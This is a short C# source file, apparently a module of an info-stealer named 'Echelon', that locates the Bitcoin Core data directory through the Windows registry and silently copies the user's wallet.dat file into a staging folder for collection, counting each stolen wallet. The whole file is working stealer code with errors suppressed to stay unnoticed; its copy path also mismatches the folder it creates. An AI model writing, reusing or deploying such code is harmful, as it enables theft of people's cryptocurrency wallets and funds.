


using System.IO;
using Microsoft.Win32;

namespace Echelon
{
    internal class BitcoinCore
    {
        public static int count;

        public static void BCStr(string directorypath)
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\BitcoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir") + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
                        count++;
                        Wallets.count++;
                    }
                    catch {}
                }
            }
            catch {}

        }
    }
}
